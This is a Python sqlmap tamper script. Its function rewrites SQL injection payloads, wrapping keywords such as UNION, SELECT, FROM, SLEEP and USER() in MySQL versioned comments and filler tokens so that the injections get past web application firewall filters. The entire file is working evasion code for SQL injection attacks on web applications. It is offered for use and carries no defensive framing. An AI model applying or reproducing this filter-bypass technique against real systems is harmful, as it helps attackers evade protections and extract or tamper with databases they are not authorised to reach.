# coding=UTF-8 

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
	pass
def tamper(payload, **kwargs):

	if payload:
		payload=payload.replace(" ","/*!*/")
		payload=payload.replace("=","/*!*/=/*!*/")
		payload=payload.replace("AND","/*!*/AND/*!*/")
		payload=payload.replace("UNION","union/*!88888cas*/")
		payload=payload.replace("#","/*!*/#")
		payload=payload.replace("USER()","USER/*!()*/")
		payload=payload.replace("DATABASE()","DATABASE/*!()*/")
		payload=payload.replace("--","/*!*/--")
		payload=payload.replace("SELECT","/*!88888cas*/select")
		payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
		payload=payload.replace('SLEEP(','sleep/**/(')
		payload=payload.replace('super_priv','/*!29440/**/super_priv*/')
		payload=payload.replace('and host=','/*!29440and*/host/*!11440=*/')
		payload=payload.replace('LIKE USER()','like (user/**/())')
		payload=payload.replace('CURRENT_USER()','CURRENT_USER/**/()')
		payload=payload.replace('SESSION_USER()','SESSION_USER(%0a)')
		print payload

		return payload
